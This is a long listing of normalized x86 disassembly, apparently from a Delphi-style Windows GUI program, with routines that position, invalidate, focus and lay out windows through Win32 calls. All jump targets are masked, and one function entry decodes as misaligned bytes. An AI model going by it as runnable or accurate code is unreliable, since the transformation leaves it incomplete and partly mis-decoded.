push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_43d7e8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_41389c
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_413730
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_4138bc
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_413840
call sub_43db40
jmp r-xdata
mov eax ebp
mov edx esi
call sub_413840
call sub_43db40
sub_43d8c0
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_43d7e8
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_43d920
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_43db40
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_43db40
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
test eax eax
jne r-xdata
sub_43d984
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43de44
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_43850c
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_42a64c
call sub_42a72c
test al al
je r-xdata
mov eax ebx
call sub_43a870
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_43a834
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_43a834
test [ eax + 0x52 ] 0x4
je r-xdata
sub_43da48
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_436cf8
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_43da80
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_44e0b4
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_43dac0
push ebx
mov ebx eax
mov eax ebx
call sub_44e0b4
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_451e20
pop ebx
retn
mov eax ebx
call sub_44e0dc
mov eax ebx
call sub_43db40
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_43daf8
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43db1c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_43db1c
sub_43db54
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_41240c
mov eax edi
call sub_43a870
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_43a834
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_43dbe8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_43db40
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_43dc20
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43de44
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43db40
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403430
sub_43dcdc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_41389c
pop esi
pop ebx
retn
sub_43dd00
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_43dcdc
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_413730
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_4138bc
sub_43dd74
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_43de44
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_43850c
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_43ddd4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43de3f
lea eax [ ebp - 0x4 ]
call sub_4055a8
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403430
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4055c0
sub_43de50
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4369ac
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_43df08
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_413840
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_4136e4
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403430
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_43df68
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403430
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e065
mov eax [ ebp - 0x14 ]
call sub_403234
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_41389c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_413840
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403430
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_43e074
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_43df68
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_43e0a0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44e0b4
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_43df68
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_43df68
mov edx eax
mov eax esi
call sub_451d20
sub_43e0e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43a870
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43a834
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_43e12c
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43d7e8
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4375c8
sub_43e174
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43e1f8
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_43de44
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_43a870
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push r-xdata
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_43a870
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_43e174
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_43a834
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_43e5d1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43e1f8
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4383a8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43e610
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43922c
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_436cc0
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_43e658
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43944c
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_43e688
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_43de44
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_43a3d8
xor ecx ecx
push ebp
push r-xdata
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_43a870
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a870
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e7be
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43a3e0
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43a834
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43e7be
mov eax [ ebp - 0x4 ]
